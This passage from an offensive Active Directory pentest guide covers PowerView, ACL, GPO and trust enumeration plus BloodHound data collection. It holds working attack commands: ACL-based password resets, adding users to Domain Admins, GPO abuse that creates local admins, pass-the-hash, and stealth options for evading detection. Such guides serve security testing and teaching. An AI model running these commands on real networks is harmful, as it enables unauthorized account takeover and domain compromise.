Get-DomainUser -LDAPFilter "(description=*)" | Select-Object samaccountname, description

# Disabled accounts
Get-DomainUser -UACFilter ACCOUNTDISABLE

# Accounts that do not require Kerberos pre-authentication (AS-REP Roastable)
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# Users who can be delegated to (unconstrained)
Get-DomainUser -UACFilter TRUSTED_FOR_DELEGATION

# Users with PASSWD_NOTREQD flag
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname
Password Set Times
# Users whose password was set more than 1 year ago
$cutoff = (Get-Date).AddYears(-1)
Get-DomainUser -Properties samaccountname, pwdlastset | Where-Object { $_.pwdlastset -lt $cutoff -and $_.pwdlastset -ne $null } | Sort-Object pwdlastset

# Users who have never logged in
Get-DomainUser -Properties samaccountname, lastlogon | Where-Object { $_.lastlogon -eq $null -or $_.lastlogon -eq 0 }

# Users with password that never expires
Get-DomainUser -UACFilter DONT_EXPIRE_PASSWORD | Select-Object samaccountname, pwdlastset

# Check password policy
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess

2.2.2 Enumerating AD Groups

Group membership determines access and privilege. Nested groups often create unintended privilege chains that are invisible without recursive enumeration.

Domain Groups
# All domain groups
Get-DomainGroup | Select-Object samaccountname, grouptype, description | Sort-Object samaccountname

# Find a specific group
Get-DomainGroup -Identity "Domain Admins" -Properties *

# Groups containing "admin" in the name
Get-DomainGroup -Identity "*admin*"

# List all members of Domain Admins
Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName, MemberObjectClass

# Recursive membership
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | Select-Object MemberName
Protected Groups

Protected groups trigger the AdminSDHolder mechanism. Members of these groups have their ACLs overwritten every 60 minutes by the SDProp process to match AdminSDHolder's ACL:

# Find all users with adminCount=1 (indicates current or past protected group membership)
Get-DomainUser -AdminCount | Select-Object samaccountname, memberof

# Protected groups: Domain Admins, Enterprise Admins, Schema Admins,
# Administrators, Account Operators, Backup Operators, Server Operators,
# Print Operators, Replicator, Domain Controllers
Managed Security Groups

Some groups have a managedBy attribute pointing to a user or group that can modify the group's membership. This is an overlooked privilege escalation path:

# Find groups with a managedBy attribute
Get-DomainGroup -LDAPFilter "(managedBy=*)" | Select-Object samaccountname, managedby

# Check if managedBy grants write-member rights
Get-DomainGroup -Identity "IT Admins" | Select-Object -ExpandProperty managedby
Local Groups
# Enumerate local groups on a remote machine
Get-NetLocalGroup -ComputerName srv01.corp.local

# Enumerate local administrators on a remote machine
Get-NetLocalGroupMember -ComputerName srv01.corp.local -GroupName "Administrators"

# Find machines where a specific user is local admin
Find-DomainUserLocation -UserIdentity jsmith -CheckAccess

# Find all machines where current user has local admin
Find-LocalAdminAccess -Verbose
Pulling Date User Added to Group

AD tracks when users are added to groups through replication metadata. This can reveal recently added privileged users:

# Get replication metadata for Domain Admins group membership changes
Get-ADReplicationAttributeMetadata -Object "CN=Domain Admins,CN=Users,DC=corp,DC=local" -Server DC01 -ShowAllLinkedValues | Where-Object { $_.AttributeName -eq "member" } | Select-Object AttributeValue, FirstOriginatingCreateTime, LastOriginatingChangeTime | Sort-Object FirstOriginatingCreateTime -Descending

# PowerView alternative: check the whenChanged attribute
Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName, @{N='Added';E={[datetime]::FromFileTime($_.LastLogon)}}

Methodology

  • Enumerate all domain users with key attributes (descriptions may contain passwords): 
    Get-DomainUser | Select-Object samaccountname, description, memberof, pwdlastset, lastlogon, useraccountcontrol
  • Identify Kerberoastable accounts (users with SPNs) and AS-REP Roastable accounts: 
    Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
  • Find users with stale passwords or accounts that never logged in: 
    $cutoff = (Get-Date).AddYears(-1)
Get-DomainUser -Properties samaccountname, pwdlastset | Where-Object { $_.pwdlastset -lt $cutoff -and $_.pwdlastset -ne $null } | Sort-Object pwdlastset
Get-DomainUser -Properties samaccountname, lastlogon | Where-Object { $_.lastlogon -eq $null -or $_.lastlogon -eq 0 }
  • Enumerate privileged group memberships recursively: 
    Get-DomainGroupMember -Identity "Domain Admins" -Recurse | Select-Object MemberName
Get-DomainUser -AdminCount | Select-Object samaccountname, memberof
  • Check for groups with a managedBy attribute (potential privilege escalation via group membership modification): 
    Get-DomainGroup -LDAPFilter "(managedBy=*)" | Select-Object samaccountname, managedby
  • Enumerate local administrators on target machines: 
    Get-NetLocalGroupMember -ComputerName srv01.corp.local -GroupName "Administrators"
Find-LocalAdminAccess -Verbose

2.3 Computer and ACL Enumeration

Computer objects represent domain-joined machines. Their attributes reveal OS versions, delegation settings, and services that create attack surfaces.

2.3.1 Enumerating AD Computers

Computer objects represent domain-joined machines. Their attributes reveal OS versions, delegation settings, and services that create attack surfaces.

Domain Computer Information
# All computers with OS info
Get-DomainComputer | Select-Object dnshostname, operatingsystem, operatingsystemversion | Sort-Object operatingsystem

# Domain controllers
Get-DomainController | Select-Object Name, IPAddress, OSVersion

# Find specific OS versions
Get-DomainComputer -OperatingSystem "*Server 2016*"
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Computers with descriptions (may contain credentials)
Get-DomainComputer -LDAPFilter "(description=*)" | Select-Object dnshostname, description
Finding Exploitable Machines
# Machines running old/unsupported operating systems
Get-DomainComputer | Where-Object { $_.operatingsystem -match "2008|2003|XP|Vista|7" } | Select-Object dnshostname, operatingsystem

# Machines with LAPS installed (ms-Mcs-AdmPwd attribute readable)
Get-DomainComputer -LDAPFilter "(ms-Mcs-AdmPwd=*)" | Select-Object dnshostname

# Machines not running with a recent password change (stale accounts)
$cutoff = (Get-Date).AddDays(-90)
Get-DomainComputer -Properties dnshostname, pwdlastset | Where-Object { $_.pwdlastset -lt $cutoff }
Delegation on Computers
# Unconstrained delegation (not domain controllers)
Get-DomainComputer -Unconstrained | Where-Object { $_.useraccountcontrol -notmatch "SERVER_TRUST_ACCOUNT" } | Select-Object dnshostname

# Constrained delegation
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto

# Resource-Based Constrained Delegation
Get-DomainComputer -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" | Select-Object dnshostname

2.3.2 Enumerating Domain ACLs

Access Control Lists (ACLs) on AD objects determine who can read, write, or modify them. Misconfigured ACLs are a major source of privilege escalation paths.

Access Control Lists Overview

Every AD object has a security descriptor containing:

  • DACL (Discretionary ACL): a list of ACEs that define who can access the object and what operations they can perform
  • SACL (System ACL): controls auditing of access attempts
  • Owner: the security principal that owns the object and can always modify its DACL

Each ACE specifies a trustee (user/group SID), an access mask (the permission), and whether it is an allow or deny entry. Key abusable permissions include GenericAll, GenericWrite, WriteDacl, WriteOwner, ForceChangePassword, and AddMembers.

Abusable ACL Rights
RightEffectAbuse
GenericAllFull control over the objectReset password, set SPN, modify group membership, write to any attribute
GenericWriteWrite to any non-protected attributeSet SPN (targeted Kerberoasting), modify logon script, write msDS-KeyCredentialLink (Shadow Credentials)
WriteDaclModify the object's DACLGrant yourself GenericAll, then abuse as above
WriteOwnerChange the object's ownerTake ownership, then grant yourself WriteDacl
ForceChangePasswordReset the target's password without knowing itTake over an account directly
AddMembers (Self)Add yourself to a groupAdd yourself to Domain Admins or other privileged groups
AllExtendedRightsAll extended rights on the objectIncludes ForceChangePassword and DS-Replication-Get-Changes
Enumerating ACLs with Built-In Cmdlets
# Get the ACL on a specific AD object
(Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=corp,DC=local").Access | Format-Table IdentityReference, ActiveDirectoryRights, AccessControlType

# Check ACL on a specific user
(Get-Acl "AD:\CN=Administrator,CN=Users,DC=corp,DC=local").Access | Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner" }
Enumerating ACLs with PowerView and SharpView
# Find interesting ACLs (non-default, potentially abusable)
Find-InterestingDomainAcl | Select-Object ObjectDN, ActiveDirectoryRights, IdentityReferenceName

# Get ACL on a specific user
Get-DomainObjectAcl -Identity "administrator" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|ForceChangePassword" } | Select-Object SecurityIdentifier, ActiveDirectoryRights

# Convert SID to name for readability
Get-DomainObjectAcl -Identity "administrator" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericAll" } | ForEach-Object {
    $_ | Add-Member -NotePropertyName "IdentityName" -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier) -PassThru
} | Select-Object IdentityName, ActiveDirectoryRights

# SharpView equivalent
.\SharpView.exe Get-DomainObjectAcl -Identity "administrator" -ResolveGUIDs
DCSync Rights Enumeration

DCSync requires two rights on the domain object: DS-Replication-Get-Changes (GUID: 1131f6aa-...) and DS-Replication-Get-Changes-All (GUID: 1131f6ad-...). By default, only Domain Admins, Enterprise Admins, and Domain Controllers have these.

# Find accounts with DCSync rights
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | Where-Object {
    ($_.ObjectAceType -match "DS-Replication-Get-Changes") -and
    ($_.ActiveDirectoryRights -match "ExtendedRight")
} | Select-Object SecurityIdentifier, ObjectAceType | ForEach-Object {
    $_ | Add-Member -NotePropertyName "Principal" -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier) -PassThru
}

# SharpView
.\SharpView.exe Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | findstr /i "replication"
Leveraging ACLs for Attacks
# If you have GenericAll on a user: reset their password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force)

# If you have GenericAll on a user: set an SPN for Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/kerberoast'}
Get-DomainSPNTicket -Identity targetuser

# If you have WriteDacl: grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attackeruser -Rights All

# If you have GenericAll on a group: add yourself
Add-DomainGroupMember -Identity "Domain Admins" -Members "attackeruser"

# If you have WriteOwner: take ownership then WriteDacl
Set-DomainObjectOwner -Identity targetobject -OwnerIdentity attackeruser
Add-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity attackeruser -Rights All

Methodology

  • Enumerate all domain computers with OS versions to identify legacy or unsupported systems: 
    Get-DomainComputer | Select-Object dnshostname, operatingsystem, operatingsystemversion | Sort-Object operatingsystem
Get-DomainComputer | Where-Object { $_.operatingsystem -match "2008|2003|XP|Vista|7" } | Select-Object dnshostname, operatingsystem
  • Identify computers configured for unconstrained, constrained, or resource-based constrained delegation: 
    Get-DomainComputer -Unconstrained | Where-Object { $_.useraccountcontrol -notmatch "SERVER_TRUST_ACCOUNT" } | Select-Object dnshostname
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto
Get-DomainComputer -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" | Select-Object dnshostname
  • Check for LAPS-managed computers where the password attribute is readable: 
    Get-DomainComputer -LDAPFilter "(ms-Mcs-AdmPwd=*)" | Select-Object dnshostname
  • Scan for non-default, abusable ACLs across the domain: 
    Find-InterestingDomainAcl | Select-Object ObjectDN, ActiveDirectoryRights, IdentityReferenceName
  • Check specific high-value objects for dangerous rights (GenericAll, WriteDacl, WriteOwner, ForceChangePassword): 
    Get-DomainObjectAcl -Identity "administrator" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|ForceChangePassword" } | ForEach-Object {
    $_ | Add-Member -NotePropertyName "IdentityName" -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier) -PassThru
} | Select-Object IdentityName, ActiveDirectoryRights
  • Enumerate accounts with DCSync rights on the domain object: 
    Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | Where-Object {
    ($_.ObjectAceType -match "DS-Replication-Get-Changes") -and
    ($_.ActiveDirectoryRights -match "ExtendedRight")
} | Select-Object SecurityIdentifier, ObjectAceType | ForEach-Object {
    $_ | Add-Member -NotePropertyName "Principal" -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier) -PassThru
}
  • If abusable ACLs are found, exploit them (e.g., GenericAll to reset password or set SPN for Kerberoasting): 
    Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force)
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/kerberoast'}
Get-DomainSPNTicket -Identity targetuser

2.4 GPO and Trust Enumeration

GPOs enforce security settings, software deployment, and script execution across the domain. Abusable GPO permissions allow attackers to modify policies applied to high-value targets.

2.4.1 Enumerating Group Policy Objects (GPOs)

GPOs enforce security settings, software deployment, and script execution across the domain. Abusable GPO permissions allow attackers to modify policies applied to high-value targets.

GPO Abuse Overview

GPO abuse requires write permissions on the GPO object itself or its linked OU/domain. An attacker who can modify a GPO linked to an OU containing Domain Controllers or privileged workstations can achieve code execution in those contexts. Common GPO abuse vectors:

  • Immediate Scheduled Task: create a one-time task via GPO Preferences that executes a payload
  • Startup/Logon Script: add a script that runs on machine startup or user logon
  • Restricted Groups / Group Policy Preferences Groups: add an attacker account to local Administrators via GPO
  • Software Installation: deploy a malicious MSI package
Gathering GPO Data
# All GPOs in the domain
Get-DomainGPO | Select-Object DisplayName, Name, gpcfilesyspath

# GPO applied to a specific computer
Get-DomainGPO -ComputerIdentity srv01.corp.local | Select-Object DisplayName

# GPOs linked to a specific OU
Get-DomainOU -Identity "ServiceAccounts" | ForEach-Object { $_.gplink }

# Enumerate what a GPO configures (read the GPO files on SYSVOL)
Get-DomainGPO -Identity "{GPO-GUID}" | Select-Object -ExpandProperty gpcfilesyspath
# Then browse: \\corp.local\SYSVOL\corp.local\Policies\{GUID}\Machine\Preferences\ScheduledTasks\

# SharpGPOAbuse: list exploitable GPOs
.\SharpGPOAbuse.exe --gpo-name "Default Domain Policy" --action list
GPO Permissions
# Find GPOs where a non-admin has write permissions
Get-DomainGPO | ForEach-Object {
    $gpo = $_
    Get-DomainObjectAcl -SearchBase "CN=$($gpo.Name),CN=Policies,CN=System,DC=corp,DC=local" -ResolveGUIDs |
    Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner|GenericWrite|GenericAll" -and $_.SecurityIdentifier -notmatch "S-1-5-32-544|S-1-5-18|S-1-5-21.*-512|S-1-5-21.*-519" } |
    Select-Object @{N='GPO';E={$gpo.DisplayName}}, SecurityIdentifier, ActiveDirectoryRights
}

# Check who can create new GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=corp,DC=local" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "CreateChild" }
Hidden GPO Code Execution Paths

GPOs support several less obvious code execution mechanisms beyond scripts and software deployment:

  • Registry settings: set a Run key or Image File Execution Options debugger
  • Scheduled Tasks (Preferences): tasks in Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
  • Services (Preferences): create or modify a Windows service via Machine\Preferences\Services\Services.xml
  • Files (Preferences): copy a file to a target path (e.g., place a DLL for DLL hijacking)
  • Environment variables: set variables that influence program behavior
# Using SharpGPOAbuse to add an immediate scheduled task
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "CORP\Domain Admins" --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "Default Domain Policy"

# Using pyGPOAbuse from Linux
python3 pygpoabuse.py 'corp.local/user:Password123' -gpo-id "{GPO-GUID}" -dc-ip 10.10.10.10 -command "cmd.exe /c net localgroup administrators attacker /add"

2.4.2 Enumerating AD Trusts

Trust relationships between domains and forests define the boundaries of authentication and authorization. Understanding trust direction, transitivity, and SID filtering is essential for cross-domain attacks.

Trust Types and Properties
PropertyValuesMeaning
DirectionInbound, Outbound, BidirectionalInbound: they trust us (we can access their resources). Outbound: we trust them. Bidirectional: both.
TransitivityTransitive, Non-transitiveTransitive trusts extend through chains (A trusts B, B trusts C, so A trusts C). Parent-child trusts are always transitive.
TypeParent-Child, Tree-Root, Forest, External, Shortcut, RealmParent-child and tree-root are automatic within a forest. Forest and external require manual creation.
SID FilteringEnabled/DisabledStrips SIDs not from the trusted domain. Enabled by default on forest trusts (blocks ExtraSids). Disabled on intra-forest trusts.
Enumerating Trust Relationships
# PowerView: enumerate all trusts
Get-DomainTrust
Get-DomainTrust -Domain child.corp.local

# Map all reachable trust relationships
Get-DomainTrustMapping

# Forest-level trusts
Get-ForestTrust
Get-ForestDomain

# nltest (built-in)
nltest /domain_trusts /all_trusts

# AD PowerShell module
Get-ADTrust -Filter *
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, IntraForest
# From Linux: enumerate trusts with ldapsearch
ldapsearch -x -H ldap://dc01.corp.local -D "user@corp.local" -w 'Password123' -b "CN=System,DC=corp,DC=local" "(objectClass=trustedDomain)" trustPartner trustDirection trustType

# BloodHound.py collects trust data automatically
bloodhound-python -u user -p Password123 -d corp.local -ns 10.10.10.10 -c Trusts
Attacking Trust Relationships

Common attacks across trust boundaries:

  • Intra-forest (parent-child): ExtraSids attack with a forged Golden Ticket containing the Enterprise Admins SID. SID filtering is not enforced within a forest, making this the primary escalation path from child to parent domain.
  • Cross-forest Kerberoasting: if a user in the trusted forest has an SPN, request a TGS ticket across the trust and crack it offline.
  • Foreign group membership: users from one domain may be members of privileged groups in another domain. Enumerate with Get-DomainForeignGroupMember.
  • Trust account abuse: the trust account password can be extracted from a compromised DC and used to forge inter-realm tickets.
  • SID History injection: if SID filtering is misconfigured or disabled on a forest trust, inject a privileged SID into the SID History to gain access across the trust boundary.
# Find foreign group members
Get-DomainForeignGroupMember | Select-Object GroupDomain, GroupName, MemberName, MemberDomain

# Find foreign users
Get-DomainForeignUser | Select-Object UserDomain, UserName, GroupDomain, GroupName

# Enumerate users in a trusted domain with SPNs (cross-forest Kerberoasting)
Get-DomainUser -Domain partner.local -SPN | Select-Object samaccountname, serviceprincipalname

Methodology

  • Enumerate all GPOs and note their SYSVOL file paths for manual inspection: 
    Get-DomainGPO | Select-Object DisplayName, Name, gpcfilesyspath
  • Identify GPOs where a non-admin principal has write permissions (potential GPO abuse): 
    Get-DomainGPO | ForEach-Object {
    $gpo = $_
    Get-DomainObjectAcl -SearchBase "CN=$($gpo.Name),CN=Policies,CN=System,DC=corp,DC=local" -ResolveGUIDs |
    Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner|GenericWrite|GenericAll" -and $_.SecurityIdentifier -notmatch "S-1-5-32-544|S-1-5-18|S-1-5-21.*-512|S-1-5-21.*-519" } |
    Select-Object @{N='GPO';E={$gpo.DisplayName}}, SecurityIdentifier, ActiveDirectoryRights
}
  • If a writable GPO is found, abuse it with SharpGPOAbuse to add a scheduled task: 
    .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "CORP\Domain Admins" --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "Default Domain Policy"
  • Enumerate all domain trust relationships and map trust chains: 
    Get-DomainTrust
Get-DomainTrustMapping
Get-ForestTrust
Get-ForestDomain
  • Identify foreign group members and users across trust boundaries: 
    Get-DomainForeignGroupMember | Select-Object GroupDomain, GroupName, MemberName, MemberDomain
Get-DomainForeignUser | Select-Object UserDomain, UserName, GroupDomain, GroupName
  • Check for cross-forest Kerberoastable accounts in trusted domains: 
    Get-DomainUser -Domain partner.local -SPN | Select-Object samaccountname, serviceprincipalname
  • From Linux, enumerate trusts via LDAP or BloodHound: 
    ldapsearch -x -H ldap://dc01.corp.local -D "user@corp.local" -w 'Password123' -b "CN=System,DC=corp,DC=local" "(objectClass=trustedDomain)" trustPartner trustDirection trustType
bloodhound-python -u user -p Password123 -d corp.local -ns 10.10.10.10 -c Trusts

3. Active Directory BloodHound

BloodHound uses graph theory to map Active Directory relationships and identify attack paths that would be difficult to find manually. It ingests data collected by SharpHound (Windows) or BloodHound.py (Linux) and visualizes relationships between principals, groups, sessions, and permissions in a Neo4j graph database.

3.1 BloodHound Setup and Overview

BloodHound requires a Neo4j graph database backend and the BloodHound GUI. Both must be installed and configured before importing any data.

3.1.1 BloodHound Setup and Installation

BloodHound requires a Neo4j graph database backend and the BloodHound GUI. Both must be installed and configured before importing any data.

Windows Installation

On Windows, install Neo4j Community Edition and download the latest BloodHound release from GitHub.

# Install Neo4j (requires Java 11+)
# Download from https://neo4j.com/download-center/
# Install as a Windows service
neo4j install-service
neo4j start

# Download BloodHound GUI
# https://github.com/BloodHoundAD/BloodHound/releases
# Extract and run BloodHound.exe
Linux Installation

On Kali/Debian, Neo4j and BloodHound can be installed from the package manager or from release binaries.

# Install Neo4j
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable latest' | sudo tee /etc/apt/sources.list.d/neo4j.list
sudo apt update && sudo apt install neo4j

# Start Neo4j
sudo systemctl start neo4j

# Install BloodHound
sudo apt install bloodhound
# Or download from GitHub releases
Configuring Neo4j and BloodHound GUI

On first launch, Neo4j requires a password change. The default credentials are neo4j:neo4j. Navigate to http://localhost:7474 in a browser to access the Neo4j console and set a new password. Then launch the BloodHound GUI and authenticate with the updated Neo4j credentials.

# Default Neo4j bolt connection
bolt://localhost:7687
# Default web console
http://localhost:7474

# Change default password via cypher
ALTER CURRENT USER SET PASSWORD FROM 'neo4j' TO 'newpassword'
Recovering Neo4j Credentials

If Neo4j credentials are lost, reset the authentication store by deleting the auth file and restarting the service.

# Linux: remove auth store
sudo rm /var/lib/neo4j/data/dbms/auth
sudo systemctl restart neo4j
# Password reverts to neo4j:neo4j

# Windows: auth file location
C:\Users\<user>\AppData\Roaming\Neo4j Community Edition\data\dbms\auth

3.1.2 BloodHound Overview and Graph Theory

BloodHound models Active Directory as a directed property graph. Every AD object (user, computer, group, domain, OU, GPO) is represented as a node. Relationships between objects (group membership, local admin rights, session data, ACL permissions) are represented as edges. An attack path is a sequence of edges from a controlled principal to a target objective.

Key graph theory concepts relevant to BloodHound:

  • Nodes: represent AD principals and objects (users, computers, groups, domains, OUs, GPOs)
  • Edges: represent relationships and permissions (MemberOf, AdminTo, HasSession, GenericAll, WriteDacl)
  • Paths: ordered sequences of nodes connected by edges. The shortest path between two nodes is the most direct attack route
  • Degree: number of edges connected to a node. High-degree nodes (e.g., Domain Admins group) are critical choke points
  • Transitive closure: group memberships are transitive. If A is a member of B, and B is a member of C, then A effectively has C's permissions

BloodHound uses the Cypher query language to traverse the graph, which allows analysts to ask questions like "find all paths from Kerberoastable users to Domain Admins" in a single query.

Methodology

  • Install Neo4j and BloodHound on Linux: 
    sudo apt update && sudo apt install neo4j bloodhound
  • Start the Neo4j service and set a new password (default is neo4j:neo4j): 
    sudo systemctl start neo4j
# Browse to http://localhost:7474 and change password
  • Launch BloodHound and authenticate with the Neo4j bolt connector: 
    # Connect to bolt://localhost:7687 with updated credentials
bloodhound
  • If Neo4j credentials are lost, reset the auth store and restart: 
    sudo rm /var/lib/neo4j/data/dbms/auth
sudo systemctl restart neo4j

3.2 Data Collection

SharpHound is the official Windows data collector for BloodHound. It queries LDAP, enumerates sessions, local groups, and ACLs across the domain, then exports the data as JSON files for BloodHound import.

3.2.1 SharpHound Data Collection from Windows

SharpHound is the official Windows data collector for BloodHound. It queries LDAP, enumerates sessions, local groups, and ACLs across the domain, then exports the data as JSON files for BloodHound import.

Basic Enumeration

A default SharpHound collection gathers users, groups, computers, sessions, and local admin data.

# Run SharpHound with default collection
.\SharpHound.exe -c All

# PowerShell module variant
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Collect all data and compress output
.\SharpHound.exe -c All --zipfilename bloodhound_output.zip
Importing Data into BloodHound

Import the ZIP archive generated by SharpHound into BloodHound via the GUI. Click the upload button (up arrow icon) on the right side, or drag and drop the ZIP file into the BloodHound window. The GUI parses each JSON file and creates nodes and edges in the Neo4j database.

# Output ZIP contains JSON files:
# computers.json, users.json, groups.json, domains.json
# sessions.json, ous.json, gpos.json, containers.json
SharpHound Options and Collection Methods

SharpHound supports multiple collection methods that can be combined for targeted or comprehensive data gathering.

MethodData CollectedNoise Level
DefaultGroup memberships, sessions, ACLs, trustsModerate
AllEverything: Default + local groups, GPO, object propsHigh
DCOnlyLDAP data only (no SMB/RPC to workstations)Low
SessionSession data from remote machinesModerate
LoggedOnPrivileged session data via registryHigh (requires admin)
ObjectPropsObject properties (OS, lastlogon, description)Low
ACLACL/ACE data for all objectsLow
GPOLocalGroupLocal group assignments via GPOLow
 
# DCOnly collection (quieter, LDAP only)
.\SharpHound.exe -c DCOnly

# Specific collection methods
.\SharpHound.exe -c Session,LoggedOn

# Target a specific domain
.\SharpHound.exe -c All -d child.corp.local

# Target a specific domain controller
.\SharpHound.exe -c All --domaincontroller dc01.corp.local
Randomize and Hide SharpHound Output

To reduce detection, SharpHound supports output obfuscation and randomized file naming.

# Randomize output file name
.\SharpHound.exe -c All --randomfilenames

# Encrypt output ZIP with a password
.\SharpHound.exe -c All --encryptzip --zippassword P@ssw0rd!

# Change output directory
.\SharpHound.exe -c All --outputdirectory C:\Temp
Session Loop Collection

Session data is volatile: a user's session only appears while they are logged in. SharpHound's loop collection repeatedly gathers session data over a time window to capture sessions that appear and disappear.

# Loop session collection for 2 hours, every 10 minutes
.\SharpHound.exe -c Session --loop --loopDuration 02:00:00 --loopInterval 00:10:00
Running from Non-Domain-Joined Systems

SharpHound can run from a system that is not joined to the target domain by using runas /netonly to execute under a domain context.

# Run cmd as a domain user (network logon only)
runas /netonly /user:CORP\jdoe cmd.exe

# In the new cmd window, run SharpHound
.\SharpHound.exe -c All -d corp.local --domaincontroller 10.10.10.1

# Alternatively, use PowerShell with explicit credentials
$cred = Get-Credential
.\SharpHound.exe -c All -d corp.local --ldapusername jdoe --ldappassword P@ss123

3.2.2 BloodHound.py Data Collection from Linux

BloodHound.py is a Python-based collector that runs from Linux. It queries LDAP and collects the same data types as SharpHound without requiring a Windows host.

Installation
# Install via pip
pip install bloodhound

# Or clone from GitHub
git clone https://github.com/fox-it/BloodHound.py
cd BloodHound.py
pip install .
BloodHound.py Options
FlagDescription
-cCollection method (All, Default, DCOnly, Session, etc.)
-dTarget domain
-uUsername
-pPassword
-nsNameserver (DC IP)
-dcDomain controller hostname
--hashesNTLM hash (LM:NT format) for pass-the-hash
--zipCompress output into a ZIP file
Using BloodHound.py
# Basic collection with credentials
bloodhound-python -c All -d corp.local -u jdoe -p 'P@ss123' -ns 10.10.10.1

# Pass-the-hash collection
bloodhound-python -c All -d corp.local -u admin -p '' --hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f -ns 10.10.10.1

# DCOnly for stealth
bloodhound-python -c DCOnly -d corp.local -u jdoe -p 'P@ss123' -ns 10.10.10.1 --zip
Output Files

BloodHound.py generates the same JSON file types as SharpHound. The output files are compatible with BloodHound CE and legacy BloodHound. Use the --zip flag to bundle them for easy import.

# Output files
20260101120000_computers.json
20260101120000_users.json
20260101120000_groups.json
20260101120000_domains.json

# Import the ZIP directly into BloodHound GUI

Methodology

  • Run SharpHound on a domain-joined Windows host to collect all data: 
    .\SharpHound.exe -c All --zipfilename bloodhound_output.zip
  • For stealth, use DCOnly collection (LDAP only, no SMB/RPC to workstations): 
    .\SharpHound.exe -c DCOnly
  • Loop session collection to capture volatile session data over time: 
    .\SharpHound.exe -c Session --loop --loopDuration 02:00:00 --loopInterval 00:10:00
  • From a non-domain-joined Windows host, use runas /netonly before running SharpHound: 
    runas /netonly /user:CORP\jdoe cmd.exe
# In the new cmd window:
.\SharpHound.exe -c All -d corp.local --domaincontroller 10.10.10.1
  • From Linux, use BloodHound.py with domain credentials: 
    bloodhound-python -c All -d corp.local -u jdoe -p 'P@ss123' -ns 10.10.10.1
  • Use BloodHound.py with pass-the-hash when only an NTLM hash is available: 
    bloodhound-python -c All -d corp.local -u admin -p '' --hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f -ns 10.10.10.1
  • Import the output ZIP into BloodHound GUI (drag and drop or use the upload button)

3.3 BloodHound Interface and Analysis

The BloodHound GUI provides a visual interface for exploring the graph database. Understanding its layout is essential for effective analysis.

3.3.1 Navigating the BloodHound GUI

The BloodHound GUI provides a visual interface for exploring the graph database. Understanding its layout is essential for effective analysis.

Graph Drawing Area

The central canvas displays the graph visualization. Nodes are rendered as icons (users, computers, groups) connected by labeled edges. Click a node to view its properties. Right-click for context options including "Shortest Paths To" and "Mark as Owned." The graph supports zooming, panning, and node dragging.

Search Bar and Pathfinding

The search bar at the top supports node name searches with autocomplete. Use the pathfinding feature to find shortest paths between two nodes:

  • Type the source node in the first field
  • Type the target node in the second field
  • BloodHound computes and visualizes the shortest path

Pathfinding also supports "Shortest Paths to Domain Admins from Owned Principals" via pre-built queries.

Upper Right Menu and Settings

The upper-right menu provides access to:

  • Settings: toggle node labels, edge labels, dark mode
  • Export: save the current graph view as an image (PNG/SVG)
  • Layout: switch between directed and hierarchical graph layouts
  • Debug: view raw Cypher queries executed by the GUI
Database Info

The Database Info panel displays statistics about the imported data:

  • Total users, computers, groups, sessions, ACLs, domains
  • Number of relationships (edges) in the database
  • Session collection quality (percentage of hosts with session data)

Use this to verify that SharpHound/BloodHound.py collected data completely. Low session counts indicate incomplete collection.

3.3.2 Nodes

Nodes represent AD objects and principals. Each node type has distinct properties and attack relevance.

Node Types and Properties
Node TypeIconKey Properties
UserPerson icondisplayname, enabled, lastlogon, admincount, hasspn, dontreqpreauth
ComputerMonitor iconoperatingsystem, enabled, unconstraineddelegation, allowedtodelegate
GroupPeople iconadmincount, description, members count
